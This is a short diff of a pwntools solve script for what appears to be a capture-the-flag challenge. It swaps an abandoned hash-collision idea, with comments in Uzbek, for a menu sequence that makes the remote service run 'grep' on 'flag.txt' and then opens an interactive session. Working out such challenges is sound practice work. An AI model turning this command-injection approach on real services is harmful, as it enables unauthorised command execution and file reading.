@@ -5,21 +5,18 @@ PORT = 30748
 
 io = remote(HOST, PORT)
 
-# payload tayyorlaymiz
-# g'oya: hash collision beradigan obyektlar yuborish
+io.sendlineafter(b"> ", b"1")
+io.sendlineafter(b"(mode)> ", b"~0")
 
-class A:
-    def __hash__(self):
-        return 1
+io.sendlineafter(b"> ", b"2")
+io.sendlineafter(b"(bin)> ", b"grep")
 
-    def __eq__(self, other):
-        return False
+io.sendlineafter(b"> ", b"3")
+io.sendlineafter(b"(arg1,arg2)> ", b"flag.txt,aaaa")
 
-a = A()
-b = A()
+io.sendlineafter(b"> ", b"4")
+io.sendlineafter(b"(switch1,switch2)> ", b"ZZZ,ZZZ")
 
-payload = str([a, b])
-
-io.sendlineafter(b">>> ", payload.encode())
+io.sendlineafter(b"> ", b"5")
 
 io.interactive()
